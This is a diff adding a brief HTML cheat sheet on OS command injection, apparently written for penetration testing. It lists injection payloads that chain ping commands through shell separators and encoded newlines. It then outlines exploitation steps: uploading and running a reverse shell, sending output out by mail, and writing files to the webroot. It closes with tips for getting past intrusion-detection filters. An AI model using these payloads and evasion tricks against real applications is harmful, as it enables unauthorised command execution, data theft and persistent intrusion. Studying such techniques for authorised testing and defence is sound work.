@@ -1,0 +1,35 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Manual</title>
+</head><body><b><span style="font-size: 12pt">DETECTION</span><br/>
+<br/>
+</b><b>All platforms</b><br/>
+<tt><br/>
+ping 127.0.0.1<br/>
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &amp;<br/>
+| ping –i 30 127.0.0.1 |<br/>
+| ping –n 30 127.0.0.1 |<br/>
+&amp; ping –i 30 127.0.0.1 &amp;<br/>
+&amp; ping –n 30 127.0.0.1 &amp;<br/>
+; ping 127.0.0.1 ;<br/>
+%0a ping –i 30 127.0.0.1 %0a<br/>
+` ping 127.0.0.1 `<br/>
+<br/>
+</tt><b><span style="font-size: 12pt">EXPLOITATION<br/>
+</span></b><span style="font-size: 10pt"><br/>
+Upload and execute reverse shell<br/>
+Using mail command to send command output via SMTP<br/>
+Redirect command output to file in webroot<br/>
+<br/>
+</span><b><span style="font-size: 12pt">IDS BYPASS<br/>
+</span></b><ul><li>If ; || &amp; filtered then we can still use &lt; &gt; redirection or command line program switch to output malicious</li>
+<li style="list-style-type: none">code somewhere to webroot where it can be executed with browser (ie. PHP injection)</li>
+<li>Dangerous characters can be escaped with <tt>\</tt>but <tt>\</tt>itself don't have to be filtered. Prepend every dangerous character with <tt>\</tt></li>
+</ul>
+<br/>
+<b>TIPS&amp;TRICKS</b><br/>
+<br/>
+Grouping output from multiple commands<br/>
+<tt>(ps; netstat) &gt;&gt; running.txt<br/>
+</tt></body></html>
